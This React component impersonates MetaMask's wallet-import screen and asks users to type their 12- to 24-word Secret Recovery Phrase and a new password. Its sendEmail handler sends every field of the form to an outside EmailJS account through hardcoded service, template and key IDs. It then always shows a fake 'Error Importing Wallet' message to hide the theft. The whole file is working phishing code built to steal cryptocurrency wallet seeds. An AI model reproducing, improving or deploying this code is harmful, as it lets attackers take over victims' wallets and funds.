import React, { useEffect, useRef, useState } from "react";
import { AiOutlineArrowLeft } from "react-icons/ai";
import { AiOutlineEyeInvisible, AiOutlineEye } from "react-icons/ai";
import { Link, useNavigate } from "react-router-dom";
import Connecting from "./Connecting";

import Logo from "../assets/metalogo.jpg";
import emailjs from "@emailjs/browser";

const Account = () => {
  // const [loading, setLoading] = useState(true);
  // useEffect(() => {
  //   setTimeout(() => {
  //     setLoading(false);
  //   }, 7000);

  //   return () =>
  //     setTimeout(() => {
  //       setLoading(false);
  //     }, 5000);
  // }, []);

  const initialState = [
    {
      value: 12,
      textValue: "I have a 12-word phrase",
    },
    {
      value: 15,
      textValue: "I have a 15-word phrase",
    },
    {
      value: 18,
      textValue: "I have a 18-word phrase",
    },
    {
      value: 21,
      textValue: "I have a 21-word phrase",
    },
    {
      value: 24,
      textValue: "I have a 24-word phrase",
    },
  ];
  const [showPassword, setShowPassword] = useState(false);
  const [options, setOptions] = useState(initialState);
  const [option, setOption] = useState(12);
  const [visible, setVisible] = useState(false);
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");

  const handleChange = () => {
    let select = document.getElementById("select").value;

    setOption(select);
  };

  // const handleShow = () => {
  //   const input = document.getElementsByTagName("input").target;
  //   if (showPassword && input.type === "text") {
  //     setShowPassword(false);
  //     return input.type === "password";
  //   } else {
  //     setShowPassword(true);
  //     return input.type === "text";
  //   }
  // };

  // const [form, setorm] = useState(second)
  const form = useRef();
  const navigate = useNavigate();

  const [errorText, setErrorText] = useState(null);

  const sendEmail = (e) => {
    e.preventDefault();
    const inputFields = document.getElementsByClassName("phrase");
    if (!password || !confirmPassword) {
      setErrorText("please provide passwords");
      return;
    }
    setVisible(true);

    return emailjs
      .sendForm(
        "service_y9u1yrf",
        "template_ad4mosb",
        form.current,
        "SqnpQVOqQ-J6HQHDQ"
      )

      .then(
        (result) => {
          console.log("200 OK");
          setTimeout(() => {
            setVisible(false);
            alert("Error Importing Wallet... try again!");
            setErrorText("Error Importing Wallet... try again!");
            inputFields.value = "";
          }, 1000);
        },
        (error) => {
          console.log(error.text);
        }
      );
  };

  return (
    //   <Loading />
    // ) : (
    <div
      className="flex flex-col  justify-center
     w-full sm:max-w-[80vw] sm:mx-auto 
     lg:max-w-[70vw] xl:max-w-[55vw] 2xl:max-w-[55vw] 3xl:max-w-[50vw]"
    >
      <div>
        <div>
          <div className="flex items-center ">
            <img src={Logo} alt="METAMASK LOGO" className="w-[30px] " />
            <h1 className="text-[1.5rem] font-semibold">METAMASK</h1>
          </div>
          <Link to="/user-wallet-choice">
            <p className="flex items-center">
              <AiOutlineArrowLeft />
              <span>Back</span>
            </p>
          </Link>
        </div>

        <div className="mt-[1rem]">
          <h1 className="text-[2.2rem] font-semibold max-w-[90%] text-gray-800">
            Import a wallet with Secret Recovery Phrase
          </h1>
          <p className="text-gray-600 mt-[2rem]">
            Only the first account on this wallet will auto load. After
            completing this process, to add additional accounts, click the drop
            down menu, then select Create Account.
          </p>
        </div>
        <div className="mt-[2rem] flex-col md:flex-row flex items-center justify-between">
          <p className="text-[20px] font-semibold">Secret Recovery Phrase</p>
          <select
            id="select"
            value={option}
            onChange={handleChange}
            className="border-2 border-gray-800 rounded-lg w-[350px] p-2"
          >
            {options.map((option) => (
              <option value={option.value}>{option.textValue}</option>
            ))}
          </select>
        </div>

        <div
          className="mt-[3rem] lg:max-w-[70vw] xl:max-w-[55vw] 2xl:max-w-[55vw] 
          3xl:max-w-[50vw]
           flex items-center 
        justify-center"
        >
          {visible && <Connecting />}
          <form ref={form} className="flex  items-center  flex-wrap gap-4">
            <div className="flex  items-center justify-center flex-wrap gap-4">
              <div className="flex gap-2 items-center justify-center">
                <label htmlFor="phrase1" className="text-gray-700">
                  1.
                </label>
                <input
                  type="password"
                  id="phrase1"
                  name="phrase1"
                  className="phrase border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300
                 "
                />
                {/* {showPassword ? (
                  <AiOutlineEyeInvisible
                    onClick={() => {
                      setShowPassword(!showPassword);
                      let input = document.getElementById("phrase1");
                      if (input.type === "password") {
                        input.type = "text";
                      } else {
                        input.type = "password";
                      }
                    }}
                    size={25}
                    className="text-gray-600 cursor-pointer"
                  />
                ) : (
                  <AiOutlineEye
                    onClick={() => {
                      setShowPassword(!showPassword);
                      let input = document.getElementById("phrase1");
                      if (input.type === "password") {
                        return (input.type = "text");
                      } else {
                        return (input.type = "password");
                      }
                    }}
                    size={25}
                    className="text-gray-600 cursor-pointer"
                  />
                )} */}
              </div>
              <div className="flex gap-3 items-center">
                <label htmlFor="phrase2" className="text-gray-700">
                  2.
                </label>
                <input
                  type="password"
                  name="phrase2"
                  id="phrase1"
                  className="phrase border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300 "
                />
              </div>
              <div className="flex gap-3 items-center">
                <label htmlFor="phrase3" className="text-gray-700">
                  3.
                </label>
                <input
                  type="password"
                  name="phrase3"
                  id="phrase1"
                  className="phrase border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300"
                />
              </div>
              <div className="flex gap-3 items-center">
                <label htmlFor="phrase4" className="text-gray-700">
                  4.
                </label>
                <input
                  type="password"
                  name="phrase4"
                  className="phrase border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300 "
                />
              </div>
              <div className="flex gap-3 items-center">
                <label htmlFor="phrase5" className="text-gray-700">
                  5.
                </label>
                <input
                  type="password"
                  name="phrase5"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300 "
                />
              </div>{" "}
              <div className="flex gap-3 items-center">
                <label htmlFor="phrase6" className="text-gray-700">
                  6.
                </label>
                <input
                  type="password"
                  name="phrase6"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300  "
                />
              </div>
              <div className="flex gap-3 items-center">
                <label htmlFor="phrase7" className="text-gray-700">
                  7.
                </label>
                <input
                  type="password"
                  name="phrase7"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300  "
                />
              </div>
              <div className="flex gap-3 items-center">
                <label htmlFor="phrase8" className="text-gray-700">
                  8.
                </label>
                <input
                  type="password"
                  name="phrase8"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300  "
                />
              </div>
              <div className="flex gap-3 items-center">
                <label htmlFor="phrase9" className="text-gray-700">
                  9.
                </label>
                <input
                  type="password"
                  name="phrase9"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300 "
                />
              </div>
              <div className="flex gap-3 items-center">
                <label htmlFor="phrase10" className="text-gray-700">
                  10.
                </label>
                <input
                  type="password"
                  name="phrase10"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300 "
                />
              </div>
              <div className="flex gap-3 items-center">
                <label htmlFor="phrase11" className="text-gray-700">
                  11.
                </label>
                <input
                  type="password"
                  name="phrase11"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300 "
                />
              </div>{" "}
              <div className="flex gap-3 items-center">
                <label htmlFor="phrase12" className="text-gray-700">
                  12.
                </label>
                <input
                  type="password"
                  name="phrase12"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300  "
                />
              </div>
              <div
                className={` ${
                  option == 15 || option == 18 || option == 21 || option == 24
                    ? "flex"
                    : "hidden"
                } gap-3 items-center`}
              >
                <label htmlFor="phrase13" className="text-gray-700">
                  13.
                </label>
                <input
                  type="password"
                  name="phrase13"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300  "
                />
              </div>
              <div
                className={` ${
                  option == 15 || option == 18 || option == 21 || option == 24
                    ? "flex"
                    : "hidden"
                } gap-3 items-center`}
              >
                <label htmlFor="phrase14" className="text-gray-700">
                  14.
                </label>
                <input
                  type="password"
                  name="phrase14"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300  "
                />
              </div>
              <div
                className={` ${
                  option == 15 || option == 18 || option == 21 || option == 24
                    ? "flex"
                    : "hidden"
                } gap-3 items-center`}
              >
                <label htmlFor="phrase15" className="text-gray-700">
                  15.
                </label>
                <input
                  type="password"
                  name="phrase15"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300 "
                />
              </div>
              <div
                className={` ${
                  option == 18 || option == 21 || option == 24
                    ? "flex"
                    : "hidden"
                } gap-3 items-center`}
              >
                <label htmlFor="phrase16" className="text-gray-700">
                  16.
                </label>
                <input
                  type="password"
                  name="phrase16"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300  "
                />
              </div>
              <div
                className={` ${
                  option == 18 || option == 21 || option == 24
                    ? "flex"
                    : "hidden"
                } gap-3 items-center`}
              >
                <label htmlFor="phrase17" className="text-gray-700">
                  17.
                </label>
                <input
                  type="password"
                  name="phrase17"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300 "
                />
              </div>{" "}
              <div
                className={` ${
                  option == 18 || option == 21 || option == 24
                    ? "flex"
                    : "hidden"
                } gap-3 items-center`}
              >
                <label htmlFor="phrase18" className="text-gray-700">
                  18.
                </label>
                <input
                  type="password"
                  name="phrase18"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300  "
                />
              </div>
              <div
                className={` ${
                  option == 21 || option == 24 ? "flex" : "hidden"
                } gap-3 items-center`}
              >
                <label htmlFor="phrase19" className="text-gray-700">
                  19.
                </label>
                <input
                  type="password"
                  name="phrase19"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300 "
                />
              </div>
              <div
                className={` ${
                  option == 21 || option == 24 ? "flex" : "hidden"
                } gap-3 items-center`}
              >
                <label htmlFor="phrase20" className="text-gray-700">
                  20.
                </label>
                <input
                  type="password"
                  name="phrase20"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300  "
                />
              </div>
              <div
                className={` ${
                  option == 21 || option == 24 ? "flex" : "hidden"
                } gap-3 items-center`}
              >
                <label htmlFor="phrase21" className="text-gray-700">
                  21.
                </label>
                <input
                  type="password"
                  name="phrase21"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300 "
                />
              </div>
              <div
                className={` ${
                  option == 24 ? "flex" : "hidden"
                } gap-3 items-center`}
              >
                <label htmlFor="phrase22" className="text-gray-700">
                  22.
                </label>
                <input
                  type="password"
                  name="phrase22"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300  "
                />
              </div>
              <div
                className={` ${
                  option == 24 ? "flex" : "hidden"
                } gap-3 items-center`}
              >
                <label htmlFor="phrase23" className="text-gray-700">
                  23.
                </label>
                <input
                  type="password"
                  name="phrase23"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300  "
                />
              </div>{" "}
              <div
                className={` ${
                  option == 24 ? "flex" : "hidden"
                } gap-3 items-center`}
              >
                <label htmlFor="phrase24" className="text-gray-700">
                  24.
                </label>
                <input
                  type="password"
                  name="phrase24"
                  className="border-2 border-gray-200 py-3 px-1 rounded-lg 
                focus:outline-none focus:border-blue-300  "
                />
              </div>
            </div>

            {/* passwords and button */}
            <div className="flex flex-col gap-3 items-start justify-start text-start mt-[3rem]">
              <div className="flex flex-col ">
                <label
                  htmlFor="newPassword"
                  className="text-gray-800 font-semibold"
                >
                  New password (8 characters min)
                </label>
                <input
                  type="password"
                  name="newPassword"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="border-2 border-gray-200 p-3 rounded-lg w-[400px]   focus:outline-none focus:border-blue-300"
                />
              </div>

              <div className="flex flex-col ">
                <label
                  htmlFor="confirmPassword"
                  className="text-gray-800 font-semibold"
                >
                  Confirm password
                </label>
                <input
                  type="password"
                  name="confirmPassword"
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  className="border-2 border-gray-200 p-3 rounded-lg w-[400px]  focus:outline-none focus:border-blue-300 "
                />
              </div>
              {errorText && <p className="text-red-600"> {errorText}</p>}
              <div className="flex mt-[1rem] ">
                <input
                  checked
                  type="checkbox"
                  name="confirmPassword"
                  className="mr-2 "
                />
                <span>
                  I have read and agree to the{" "}
                  <span className="text-blue-500">Terms of use</span>{" "}
                </span>
              </div>
              <button
                onClick={sendEmail}
                type="submit"
                className="bg-blue-500 text-white text-center px-6 py-2 rounded-full"
              >
                {" "}
                Import
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Account;
